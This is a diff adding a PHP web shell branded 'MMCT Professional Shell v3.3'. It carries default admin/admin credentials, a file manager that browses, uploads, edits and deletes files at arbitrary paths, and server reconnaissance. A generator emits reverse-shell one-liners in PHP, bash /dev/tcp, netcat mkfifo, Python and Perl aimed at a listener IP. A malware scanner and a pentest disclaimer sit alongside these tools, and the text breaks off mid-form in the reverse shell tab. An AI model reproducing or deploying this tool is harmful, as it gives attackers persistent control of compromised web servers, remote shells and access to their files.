@@ -1,0 +1,1686 @@
+<?php
+error_reporting(0);
+session_start();
+
+// ==================== CONFIGURATION ====================
+$config = [
+    'username' => 'admin',
+    'password_hash' => '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918', // admin
+    'session_timeout' => 1800, // 30 minutes
+    'allowed_ips' => [], // Empty array = all IPs allowed
+    'encryption_key' => 'MMCT_SECURE_KEY_2024',
+];
+
+// ==================== AUTHENTICATION ====================
+function checkAuth() {
+    global $config;
+    
+    // Check session
+    if (isset($_SESSION['auth']) && $_SESSION['auth'] === true) {
+        if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > $config['session_timeout'])) {
+            session_destroy();
+            return false;
+        }
+        $_SESSION['last_activity'] = time();
+        return true;
+    }
+    
+    // Check basic auth
+    if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW'])) {
+        return false;
+    }
+    
+    $username = $_SERVER['PHP_AUTH_USER'];
+    $password = $_SERVER['PHP_AUTH_PW'];
+    
+    if ($username === $config['username'] && 
+        hash('sha256', $password) === $config['password_hash']) {
+        $_SESSION['auth'] = true;
+        $_SESSION['last_activity'] = time();
+        $_SESSION['username'] = $username;
+        return true;
+    }
+    
+    return false;
+}
+
+if (!checkAuth()) {
+    header('WWW-Authenticate: Basic realm="MMCT Secure Shell"');
+    header('HTTP/1.0 401 Unauthorized');
+    echo '<!DOCTYPE html>
+    <html>
+    <head>
+        <title>Authentication Required</title>
+        <style>
+            body { background: linear-gradient(135deg, #0f2027, #203a43); 
+                    color: white; font-family: Arial; text-align: center; 
+                    padding: 100px; }
+            .login-box { background: rgba(0,0,0,0.8); padding: 40px; 
+                        border-radius: 10px; display: inline-block; 
+                        border: 1px solid #4a90e2; }
+            h1 { color: #4a90e2; }
+            .footer { margin-top: 30px; font-size: 12px; color: #666; }
+        </style>
+    </head>
+    <body>
+        <div class="login-box">
+            <h1>🔒 MMCT SECURE SHELL</h1>
+            <p>Authentication Required</p>
+            <p><small>Enter your credentials to continue</small></p>
+            <div class="footer">Copyright @2023 MMCT. V3.3</div>
+        </div>
+    </body>
+    </html>';
+    exit;
+}
+
+// ==================== ENCRYPTION FUNCTIONS ====================
+function encrypt($data, $key) {
+    $iv = openssl_random_pseudo_bytes(16);
+    $encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, 0, $iv);
+    return base64_encode($iv . $encrypted);
+}
+
+function decrypt($data, $key) {
+    $data = base64_decode($data);
+    $iv = substr($data, 0, 16);
+    $encrypted = substr($data, 16);
+    return openssl_decrypt($encrypted, 'AES-256-CBC', $key, 0, $iv);
+}
+
+// ==================== SYSTEM INFORMATION ====================
+$system_info = [
+    'os' => php_uname(),
+    'server_ip' => gethostbyname(gethostname()),
+    'client_ip' => $_SERVER['REMOTE_ADDR'],
+    'php_version' => phpversion(),
+    'web_host' => $_SERVER['HTTP_HOST'],
+    'server_software' => $_SERVER['SERVER_SOFTWARE'],
+    'document_root' => $_SERVER['DOCUMENT_ROOT'],
+    'server_admin' => $_SERVER['SERVER_ADMIN'] ?? 'N/A',
+    'script_path' => __FILE__,
+    'memory_limit' => ini_get('memory_limit'),
+    'max_execution_time' => ini_get('max_execution_time'),
+    'loaded_extensions' => get_loaded_extensions(),
+    'disk_total' => disk_total_space("/"),
+    'disk_free' => disk_free_space("/"),
+];
+
+// ==================== SECURITY AUDIT FUNCTIONS ====================
+function scanForMalware($path) {
+    $results = [];
+    $dangerous_functions = [
+        'eval', 'shell_exec', 'system', 'passthru', 'exec', 
+        'popen', 'proc_open', 'assert', 'create_function',
+        'base64_decode', 'gzinflate', 'gzuncompress', 'str_rot13'
+    ];
+    
+    $dangerous_patterns = [
+        '/<\?(?!xml|php)/i',
+        '/<script.*?>.*?<\/script>/is',
+        '/javascript:/i',
+        '/onload\s*=/i',
+        '/onerror\s*=/i'
+    ];
+    
+    $files = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($path),
+        RecursiveIteratorIterator::SELF_FIRST
+    );
+    
+    foreach($files as $file) {
+        if($file->isDir()) continue;
+        
+        $filename = $file->getFilename();
+        $filepath = $file->getPathname();
+        $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+        
+        // Skip certain files
+        if(in_array($filename, ['.', '..', '.htaccess', '.htpasswd'])) continue;
+        
+        $content = @file_get_contents($filepath);
+        if($content === false) continue;
+        
+        $detected = [];
+        $lines = [];
+        
+        // Check for dangerous PHP functions
+        foreach($dangerous_functions as $func) {
+            if(stripos($content, $func) !== false) {
+                $detected[] = $func;
+                
+                // Find line numbers
+                $content_lines = explode("\n", $content);
+                foreach($content_lines as $line_num => $line) {
+                    if(stripos($line, $func) !== false) {
+                        $lines[] = $line_num + 1;
+                    }
+                }
+            }
+        }
+        
+        // Check for dangerous patterns
+        foreach($dangerous_patterns as $pattern) {
+            if(preg_match($pattern, $content)) {
+                $detected[] = 'Dangerous Pattern';
+            }
+        }
+        
+        // Check for encoded code
+        if(preg_match('/base64_decode\([\'\"][A-Za-z0-9+\/=]+[\'\"]\)/i', $content)) {
+            $detected[] = 'Base64 Encoding';
+        }
+        
+        if(preg_match('/eval\s*\(/i', $content)) {
+            $detected[] = 'Eval Detected';
+        }
+        
+        // Check file extensions
+        $suspicious_extensions = ['php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'phps'];
+        if(in_array($extension, $suspicious_extensions)) {
+            $webshell_signatures = [
+                'backdoor', 'shell', 'c99', 'r57', 'b374k', 'wso',
+                'hakker', 'cpanel', 'bypass', 'hacking', 'exploit'
+            ];
+            
+            foreach($webshell_signatures as $sig) {
+                if(stripos($content, $sig) !== false) {
+                    $detected[] = "Webshell Signature: $sig";
+                }
+            }
+        }
+        
+        if(!empty($detected)) {
+            $results[] = [
+                'file' => $filepath,
+                'filename' => $filename,
+                'detections' => array_unique($detected),
+                'lines' => array_slice(array_unique($lines), 0, 5),
+                'size' => filesize($filepath),
+                'perms' => perms($filepath),
+                'last_modified' => date('Y-m-d H:i:s', filemtime($filepath))
+            ];
+        }
+    }
+    
+    return $results;
+}
+
+// ==================== REVERSE SHELL FUNCTIONS ====================
+function reverseShell($ip, $port, $type = 'php') {
+    $output = '';
+    
+    switch($type) {
+        case 'php':
+            $output = "<?php\n";
+            $output .= "// PHP Reverse Shell\n";
+            $output .= "\$ip = '$ip';\n";
+            $output .= "\$port = $port;\n";
+            $output .= "\$sock = fsockopen(\$ip, \$port);\n";
+            $output .= "if(!\$sock) { exit; }\n";
+            $output .= "fputs(\$sock, \"MMCT Reverse Shell Connected\\n\");\n";
+            $output .= "while(\$cmd = fread(\$sock, 2048)) {\n";
+            $output .= "    \$output = shell_exec(\$cmd);\n";
+            $output .= "    fwrite(\$sock, \$output);\n";
+            $output .= "}\n";
+            $output .= "?>";
+            break;
+            
+        case 'bash':
+            $output = "bash -i >& /dev/tcp/$ip/$port 0>&1";
+            break;
+            
+        case 'nc':
+            $output = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f";
+            break;
+            
+        case 'python':
+            $output = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
+            break;
+            
+        case 'perl':
+            $output = "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
+            break;
+    }
+    
+    return $output;
+}
+
+// ==================== MAIN HTML OUTPUT ====================
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔐 MMCT Professional Shell v3.3</title>
+    <link href="https://fonts.googleapis.com/css?family=Roboto+Mono:300,400,500|Rajdhani:400,500,600&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #3498db;
+            --accent-color: #e74c3c;
+            --success-color: #27ae60;
+            --warning-color: #f39c12;
+            --dark-bg: #1a1a2e;
+            --darker-bg: #16213e;
+            --light-text: #ecf0f1;
+            --border-color: #2c3e50;
+        }
+        
+        body {
+            font-family: 'Roboto Mono', monospace;
+            background: linear-gradient(135deg, var(--dark-bg), var(--darker-bg));
+            color: var(--light-text);
+            min-height: 100vh;
+        }
+        
+        .glass-card {
+            background: rgba(25, 25, 35, 0.9);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        
+        .nav-tabs {
+            border-bottom: 2px solid var(--border-color);
+        }
+        
+        .nav-tabs .nav-link {
+            color: #95a5a6;
+            border: none;
+            border-bottom: 3px solid transparent;
+            margin-bottom: -2px;
+            font-weight: 500;
+            font-family: 'Rajdhani', sans-serif;
+        }
+        
+        .nav-tabs .nav-link.active {
+            color: var(--secondary-color);
+            background: transparent;
+            border-bottom: 3px solid var(--secondary-color);
+        }
+        
+        .code-block {
+            background: #0d1117;
+            color: #8b949e;
+            font-family: 'Roboto Mono', monospace;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #30363d;
+            overflow-x: auto;
+        }
+        
+        .stat-card {
+            background: rgba(44, 62, 80, 0.3);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 15px;
+            transition: transform 0.3s;
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-5px);
+            border-color: var(--secondary-color);
+        }
+        
+        .stat-card i {
+            font-size: 2em;
+            margin-bottom: 10px;
+        }
+        
+        .btn-custom {
+            background: linear-gradient(135deg, var(--secondary-color), #2980b9);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            padding: 10px 20px;
+            transition: all 0.3s;
+        }
+        
+        .btn-custom:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(52, 152, 219, 0.4);
+        }
+        
+        .table-custom {
+            background: rgba(30, 30, 46, 0.7);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        
+        .table-custom th {
+            background: rgba(44, 62, 80, 0.8);
+            border: none;
+            padding: 15px;
+            font-weight: 600;
+        }
+        
+        .table-custom td {
+            border-color: var(--border-color);
+            padding: 12px 15px;
+        }
+        
+        .table-custom tr:hover {
+            background: rgba(52, 152, 219, 0.1);
+        }
+        
+        .danger-row {
+            background: linear-gradient(90deg, rgba(231, 76, 60, 0.1), transparent);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { background-color: rgba(231, 76, 60, 0.1); }
+            50% { background-color: rgba(231, 76, 60, 0.2); }
+            100% { background-color: rgba(231, 76, 60, 0.1); }
+        }
+        
+        .terminal {
+            background: #000;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            padding: 15px;
+            border-radius: 5px;
+            height: 400px;
+            overflow-y: auto;
+        }
+        
+        .terminal-line {
+            margin-bottom: 5px;
+        }
+        
+        .terminal-prompt {
+            color: #00ffff;
+        }
+        
+        .file-icon { color: #3498db; }
+        .folder-icon { color: #f39c12; }
+        .danger-icon { color: #e74c3c; }
+        .success-icon { color: #27ae60; }
+        
+        .progress-bar-custom {
+            background: linear-gradient(90deg, var(--secondary-color), #9b59b6);
+            border-radius: 10px;
+        }
+        
+        .modal-content {
+            background: var(--dark-bg);
+            border: 1px solid var(--border-color);
+        }
+        
+        .form-control-custom {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            color: var(--light-text);
+        }
+        
+        .form-control-custom:focus {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: var(--secondary-color);
+            box-shadow: 0 0 0 0.2rem rgba(52, 152, 219, 0.25);
+            color: var(--light-text);
+        }
+    </style>
+</head>
+<body>
+    <!-- Top Navigation -->
+    <nav class="navbar navbar-expand-lg navbar-dark glass-card mb-4">
+        <div class="container-fluid">
+            <a class="navbar-brand" href="#">
+                <i class="fas fa-shield-alt"></i> MMCT <span class="text-warning">PRO</span> SHELL
+            </a>
+            <div class="d-flex align-items-center">
+                <span class="badge bg-success me-3">v3.3</span>
+                <span class="text-muted small">
+                    <i class="fas fa-user me-1"></i> <?php echo $_SESSION['username'] ?? 'Admin'; ?>
+                    | <i class="fas fa-clock me-1"></i> <span id="liveClock"></span>
+                </span>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container-fluid">
+        <!-- System Stats Row -->
+        <div class="row mb-4">
+            <div class="col-lg-3 col-md-6 mb-3">
+                <div class="stat-card text-center">
+                    <i class="fas fa-server text-info"></i>
+                    <h6>SYSTEM OS</h6>
+                    <p class="mb-0 small"><?php echo substr($system_info['os'], 0, 30) . '...'; ?></p>
+                </div>
+            </div>
+            <div class="col-lg-3 col-md-6 mb-3">
+                <div class="stat-card text-center">
+                    <i class="fas fa-network-wired text-success"></i>
+                    <h6>NETWORK</h6>
+                    <p class="mb-0 small">Server: <?php echo $system_info['server_ip']; ?></p>
+                    <p class="mb-0 small">Client: <?php echo $system_info['client_ip']; ?></p>
+                </div>
+            </div>
+            <div class="col-lg-3 col-md-6 mb-3">
+                <div class="stat-card text-center">
+                    <i class="fas fa-code text-warning"></i>
+                    <h6>PHP ENVIRONMENT</h6>
+                    <p class="mb-0 small">v<?php echo $system_info['php_version']; ?></p>
+                    <p class="mb-0 small">Mem: <?php echo $system_info['memory_limit']; ?></p>
+                </div>
+            </div>
+            <div class="col-lg-3 col-md-6 mb-3">
+                <div class="stat-card text-center">
+                    <i class="fas fa-hdd text-primary"></i>
+                    <h6>DISK SPACE</h6>
+                    <p class="mb-0 small">
+                        Free: <?php echo formatBytes($system_info['disk_free']); ?> / 
+                        Total: <?php echo formatBytes($system_info['disk_total']); ?>
+                    </p>
+                    <?php 
+                    $disk_usage = 100 - (($system_info['disk_free'] / $system_info['disk_total']) * 100);
+                    $disk_color = $disk_usage > 90 ? 'danger' : ($disk_usage > 70 ? 'warning' : 'success');
+                    ?>
+                    <div class="progress mt-2" style="height: 8px;">
+                        <div class="progress-bar progress-bar-custom" 
+                             role="progressbar" 
+                             style="width: <?php echo $disk_usage; ?>%"
+                             aria-valuenow="<?php echo $disk_usage; ?>" 
+                             aria-valuemin="0" 
+                             aria-valuemax="100"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Main Content Tabs -->
+        <ul class="nav nav-tabs" id="mainTab" role="tablist">
+            <li class="nav-item" role="presentation">
+                <button class="nav-link active" id="file-tab" data-bs-toggle="tab" data-bs-target="#file" type="button">
+                    <i class="fas fa-folder-open me-2"></i>File Manager
+                </button>
+            </li>
+            <li class="nav-item" role="presentation">
+                <button class="nav-link" id="audit-tab" data-bs-toggle="tab" data-bs-target="#audit" type="button">
+                    <i class="fas fa-shield-alt me-2"></i>Security Audit
+                </button>
+            </li>
+            <li class="nav-item" role="presentation">
+                <button class="nav-link" id="reverse-tab" data-bs-toggle="tab" data-bs-target="#reverse" type="button">
+                    <i class="fas fa-plug me-2"></i>Reverse Shell
+                </button>
+            </li>
+            <li class="nav-item" role="presentation">
+                <button class="nav-link" id="system-tab" data-bs-toggle="tab" data-bs-target="#system" type="button">
+                    <i class="fas fa-info-circle me-2"></i>System Info
+                </button>
+            </li>
+            <li class="nav-item" role="presentation">
+                <button class="nav-link" id="tools-tab" data-bs-toggle="tab" data-bs-target="#tools" type="button">
+                    <i class="fas fa-tools me-2"></i>Advanced Tools
+                </button>
+            </li>
+        </ul>
+
+        <div class="tab-content mt-4" id="mainTabContent">
+            <!-- File Manager Tab -->
+            <div class="tab-pane fade show active" id="file" role="tabpanel">
+                <?php
+                if(isset($_GET['path'])) {
+                    $path = $_GET['path'];
+                } else {
+                    $path = getcwd();
+                }
+                $path = str_replace('\\', '/', $path);
+                
+                // Handle file upload
+                if(isset($_FILES['file'])) {
+                    if(copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
+                        echo '<div class="alert alert-success alert-dismissible fade show">
+                                <i class="fas fa-check-circle me-2"></i>File uploaded successfully!
+                                <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
+                              </div>';
+                    } else {
+                        echo '<div class="alert alert-danger alert-dismissible fade show">
+                                <i class="fas fa-times-circle me-2"></i>Failed to upload file!
+                                <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
+                              </div>';
+                    }
+                }
+                ?>
+                
+                <!-- File Manager Content -->
+                <div class="row">
+                    <div class="col-md-12">
+                        <div class="glass-card p-4 mb-4">
+                            <div class="d-flex justify-content-between align-items-center mb-3">
+                                <h5><i class="fas fa-folder-open me-2"></i>Current Directory: <?php echo htmlspecialchars($path); ?></h5>
+                                <button class="btn btn-sm btn-custom" data-bs-toggle="modal" data-bs-target="#uploadModal">
+                                    <i class="fas fa-upload me-1"></i>Upload File
+                                </button>
+                            </div>
+                            
+                            <!-- Breadcrumb Navigation -->
+                            <nav aria-label="breadcrumb">
+                                <ol class="breadcrumb bg-dark p-2 rounded">
+                                    <?php
+                                    $paths = explode('/', $path);
+                                    foreach($paths as $id => $pat) {
+                                        if($pat == '' && $id == 0) {
+                                            echo '<li class="breadcrumb-item">
+                                                    <a href="?path=/" class="text-info">
+                                                        <i class="fas fa-home"></i> Root
+                                                    </a>
+                                                  </li>';
+                                            continue;
+                                        }
+                                        if($pat == '') continue;
+                                        echo '<li class="breadcrumb-item">
+                                                <a href="?path=';
+                                        for($i = 0; $i <= $id; $i++) {
+                                            echo $paths[$i];
+                                            if($i != $id) echo '/';
+                                        }
+                                        echo '" class="text-info">' . $pat . '</a>
+                                              </li>';
+                                    }
+                                    ?>
+                                </ol>
+                            </nav>
+                            
+                            <!-- File Listing -->
+                            <div class="table-responsive mt-3">
+                                <table class="table table-custom">
+                                    <thead>
+                                        <tr>
+                                            <th>Name</th>
+                                            <th>Size</th>
+                                            <th>Permissions</th>
+                                            <th>Last Modified</th>
+                                            <th>Actions</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        <?php
+                                        $scandir = scandir($path);
+                                        // Show parent directory first
+                                        if($path != '/') {
+                                            $parent = dirname($path);
+                                            echo '<tr>
+                                                    <td>
+                                                        <i class="fas fa-level-up-alt folder-icon me-2"></i>
+                                                        <a href="?path=' . urlencode($parent) . '" class="text-warning">
+                                                            <strong>.. (Parent Directory)</strong>
+                                                        </a>
+                                                    </td>
+                                                    <td><span class="badge bg-info">DIR</span></td>
+                                                    <td><code>drwxr-xr-x</code></td>
+                                                    <td>-</td>
+                                                    <td>
+                                                        <a href="?path=' . urlencode($parent) . '" class="btn btn-sm btn-outline-info">
+                                                            <i class="fas fa-folder-open"></i>
+                                                        </a>
+                                                    </td>
+                                                  </tr>';
+                                        }
+                                        
+                                        // List directories
+                                        foreach($scandir as $item) {
+                                            if($item == '.' || $item == '..') continue;
+                                            $full_path = $path . '/' . $item;
+                                            
+                                            if(is_dir($full_path)) {
+                                                $modified = date('Y-m-d H:i', filemtime($full_path));
+                                                echo '<tr>
+                                                        <td>
+                                                            <i class="fas fa-folder folder-icon me-2"></i>
+                                                            <a href="?path=' . urlencode($full_path) . '" class="text-warning">
+                                                                ' . htmlspecialchars($item) . '
+                                                            </a>
+                                                        </td>
+                                                        <td><span class="badge bg-info">DIR</span></td>
+                                                        <td>
+                                                            <code class="' . (is_writable($full_path) ? 'text-success' : 'text-warning') . '">
+                                                                ' . perms($full_path) . '
+                                                            </code>
+                                                        </td>
+                                                        <td>' . $modified . '</td>
+                                                        <td>
+                                                            <div class="btn-group btn-group-sm">
+                                                                <a href="?path=' . urlencode($full_path) . '" 
+                                                                   class="btn btn-outline-info" title="Open">
+                                                                    <i class="fas fa-folder-open"></i>
+                                                                </a>
+                                                                <a href="?action=edit&file=' . urlencode($full_path) . '" 
+                                                                   class="btn btn-outline-warning" title="Edit">
+                                                                    <i class="fas fa-edit"></i>
+                                                                </a>
+                                                                <a href="?action=delete&file=' . urlencode($full_path) . '" 
+                                                                   class="btn btn-outline-danger" 
+                                                                   onclick="return confirm(\'Delete this directory?\')" 
+                                                                   title="Delete">
+                                                                    <i class="fas fa-trash"></i>
+                                                                </a>
+                                                            </div>
+                                                        </td>
+                                                      </tr>';
+                                            }
+                                        }
+                                        
+                                        // List files
+                                        foreach($scandir as $item) {
+                                            if($item == '.' || $item == '..') continue;
+                                            $full_path = $path . '/' . $item;
+                                            
+                                            if(is_file($full_path)) {
+                                                $size = filesize($full_path);
+                                                $modified = date('Y-m-d H:i', filemtime($full_path));
+                                                $ext = pathinfo($item, PATHINFO_EXTENSION);
+                                                
+                                                echo '<tr>
+                                                        <td>
+                                                            <i class="fas fa-file file-icon me-2"></i>
+                                                            <a href="?view=' . urlencode($full_path) . '" class="text-info">
+                                                                ' . htmlspecialchars($item) . '
+                                                            </a>
+                                                            <small class="text-muted d-block">' . $ext . ' file</small>
+                                                        </td>
+                                                        <td>' . formatBytes($size) . '</td>
+                                                        <td>
+                                                            <code class="' . (is_writable($full_path) ? 'text-success' : 'text-warning') . '">
+                                                                ' . perms($full_path) . '
+                                                            </code>
+                                                        </td>
+                                                        <td>' . $modified . '</td>
+                                                        <td>
+                                                            <div class="btn-group btn-group-sm">
+                                                                <a href="?view=' . urlencode($full_path) . '" 
+                                                                   class="btn btn-outline-info" title="View">
+                                                                    <i class="fas fa-eye"></i>
+                                                                </a>
+                                                                <a href="' . htmlspecialchars($full_path) . '" 
+                                                                   class="btn btn-outline-success" target="_blank" title="Download">
+                                                                    <i class="fas fa-download"></i>
+                                                                </a>
+                                                                <a href="?action=edit&file=' . urlencode($full_path) . '" 
+                                                                   class="btn btn-outline-warning" title="Edit">
+                                                                    <i class="fas fa-edit"></i>
+                                                                </a>
+                                                                <a href="?action=delete&file=' . urlencode($full_path) . '" 
+                                                                   class="btn btn-outline-danger" 
+                                                                   onclick="return confirm(\'Delete this file?\')" 
+                                                                   title="Delete">
+                                                                    <i class="fas fa-trash"></i>
+                                                                </a>
+                                                            </div>
+                                                        </td>
+                                                      </tr>';
+                                            }
+                                        }
+                                        ?>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Upload Modal -->
+                <div class="modal fade" id="uploadModal" tabindex="-1">
+                    <div class="modal-dialog">
+                        <div class="modal-content">
+                            <div class="modal-header">
+                                <h5 class="modal-title"><i class="fas fa-upload me-2"></i>Upload File</h5>
+                                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                            </div>
+                            <div class="modal-body">
+                                <form method="POST" enctype="multipart/form-data">
+                                    <div class="mb-3">
+                                        <label class="form-label">Select File</label>
+                                        <input type="file" name="file" class="form-control form-control-custom" required>
+                                    </div>
+                                    <div class="mb-3">
+                                        <label class="form-label">Target Directory</label>
+                                        <input type="text" class="form-control form-control-custom" 
+                                               value="<?php echo htmlspecialchars($path); ?>" readonly>
+                                    </div>
+                                    <div class="d-grid">
+                                        <button type="submit" class="btn btn-custom">
+                                            <i class="fas fa-cloud-upload-alt me-2"></i>Upload File
+                                        </button>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Security Audit Tab -->
+            <div class="tab-pane fade" id="audit" role="tabpanel">
+                <div class="glass-card p-4">
+                    <div class="d-flex justify-content-between align-items-center mb-4">
+                        <h4><i class="fas fa-shield-alt me-2"></i>Security Audit & Malware Scanner</h4>
+                        <button class="btn btn-custom" onclick="runFullScan()">
+                            <i class="fas fa-search me-2"></i>Run Full Scan
+                        </button>
+                    </div>
+                    
+                    <div class="alert alert-warning">
+                        <i class="fas fa-exclamation-triangle me-2"></i>
+                        <strong>Warning:</strong> This tool scans for potentially malicious code. Use with caution on production systems.
+                    </div>
+                    
+                    <div class="row mb-4">
+                        <div class="col-md-6">
+                            <div class="stat-card">
+                                <h6><i class="fas fa-search me-2"></i>Quick Scan</h6>
+                                <p class="small text-muted">Scan current directory for suspicious files</p>
+                                <form method="GET">
+                                    <input type="hidden" name="scan" value="quick">
+                                    <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">
+                                    <button type="submit" class="btn btn-outline-warning w-100">
+                                        <i class="fas fa-bolt me-2"></i>Quick Scan
+                                    </button>
+                                </form>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="stat-card">
+                                <h6><i class="fas fa-search-plus me-2"></i>Deep Scan</h6>
+                                <p class="small text-muted">Recursively scan all subdirectories</p>
+                                <form method="GET">
+                                    <input type="hidden" name="scan" value="deep">
+                                    <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">
+                                    <button type="submit" class="btn btn-outline-danger w-100">
+                                        <i class="fas fa-radar me-2"></i>Deep Scan
+                                    </button>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <?php
+                    if(isset($_GET['scan'])) {
+                        $scan_type = $_GET['scan'];
+                        $scan_path = $_GET['path'] ?? getcwd();
+                        
+                        echo '<div class="mt-4">';
+                        echo '<h5>Scan Results for: ' . htmlspecialchars($scan_path) . '</h5>';
+                        
+                        $results = scanForMalware($scan_path);
+                        
+                        if(empty($results)) {
+                            echo '<div class="alert alert-success">
+                                    <i class="fas fa-check-circle me-2"></i>
+                                    No suspicious files found in the scanned directory.
+                                  </div>';
+                        } else {
+                            echo '<div class="alert alert-danger">
+                                    <i class="fas fa-exclamation-triangle me-2"></i>
+                                    Found <strong>' . count($results) . '</strong> potentially dangerous file(s)
+                                  </div>';
+                            
+                            echo '<div class="table-responsive">
+                                    <table class="table table-custom">
+                                        <thead>
+                                            <tr class="bg-danger">
+                                                <th>File</th>
+                                                <th>Threats Detected</th>
+                                                <th>Size</th>
+                                                <th>Permissions</th>
+                                                <th>Actions</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>';
+                            
+                            foreach($results as $result) {
+                                echo '<tr class="danger-row">
+                                        <td>
+                                            <i class="fas fa-file-code danger-icon me-2"></i>
+                                            <strong>' . htmlspecialchars($result['filename']) . '</strong><br>
+                                            <small class="text-muted">' . htmlspecialchars($result['file']) . '</small>
+                                        </td>
+                                        <td>';
+                                foreach($result['detections'] as $detection) {
+                                    echo '<span class="badge bg-danger me-1 mb-1">' . $detection . '</span>';
+                                }
+                                if(!empty($result['lines'])) {
+                                    echo '<br><small class="text-warning">Lines: ' . implode(', ', $result['lines']) . '</small>';
+                                }
+                                echo '</td>
+                                        <td>' . formatBytes($result['size']) . '</td>
+                                        <td><code>' . $result['perms'] . '</code></td>
+                                        <td>
+                                            <div class="btn-group btn-group-sm">
+                                                <a href="?view=' . urlencode($result['file']) . '" 
+                                                   class="btn btn-outline-warning" title="Inspect">
+                                                    <i class="fas fa-eye"></i>
+                                                </a>
+                                                <a href="?action=delete&file=' . urlencode($result['file']) . '" 
+                                                   class="btn btn-outline-danger" 
+                                                   onclick="return confirm(\'Delete this suspicious file?\')" 
+                                                   title="Delete">
+                                                    <i class="fas fa-trash"></i>
+                                                </a>
+                                                <a href="' . htmlspecialchars($result['file']) . '" 
+                                                   target="_blank" 
+                                                   class="btn btn-outline-info" title="Download">
+                                                    <i class="fas fa-download"></i>
+                                                </a>
+                                            </div>
+                                        </td>
+                                      </tr>';
+                            }
+                            
+                            echo '</tbody></table></div>';
+                        }
+                        echo '</div>';
+                    }
+                    ?>
+                    
+                    <div class="mt-4">
+                        <h5><i class="fas fa-history me-2"></i>Recent Threats Database</h5>
+                        <div class="code-block small">
+                            <?php
+                            $threat_signatures = [
+                                'eval(base64_decode(' => 'Base64 encoded backdoor',
+                                'shell_exec(' => 'Shell command execution',
+                                'system(' => 'System command execution',
+                                'popen(' => 'Process opening',
+                                'proc_open(' => 'Process opening (advanced)',
+                                'passthru(' => 'Pass-through execution',
+                                'assert(' => 'Assertion execution',
+                                'create_function(' => 'Dynamic function creation',
+                                'gzuncompress(' => 'Compressed code',
+                                'str_rot13(' => 'ROT13 encoded code',
+                                '$_GET[password]' => 'Password in URL',
+                                '$_POST[cmd]' => 'Command in POST data',
+                                'c99shell' => 'c99 Shell signature',
+                                'r57shell' => 'r57 Shell signature',
+                                'b374k' => 'b374k Shell signature',
+                                'WSO Shell' => 'Web Shell by oRb',
+                            ];
+                            
+                            foreach($threat_signatures as $sig => $desc) {
+                                echo '<div class="terminal-line">
+                                        <span class="terminal-prompt">$</span> 
+                                        <span class="text-danger">' . $sig . '</span>
+                                        <span class="text-muted"> // ' . $desc . '</span>
+                                      </div>';
+                            }
+                            ?>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Reverse Shell Tab -->
+            <div class="tab-pane fade" id="reverse" role="tabpanel">
+                <div class="glass-card p-4">
+                    <div class="alert alert-danger mb-4">
+                        <i class="fas fa-skull-crossbones me-2"></i>
+                        <strong>Warning:</strong> Reverse Shell tools should only be used for authorized penetration testing.
+                        Unauthorized use is illegal.
+                    </div>
+                    
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="stat-card h-100">
+                                <h4><i class="fas fa-terminal me-2"></i>Reverse Shell Generator</h4>
+                                <p class="text-muted small">Generate reverse shell code for various languages</p>
+                                
+                                <form id="reverseShellForm">
+                                    <div class="mb-3">
+                                        <label class="form-label">Listener IP Address</label>
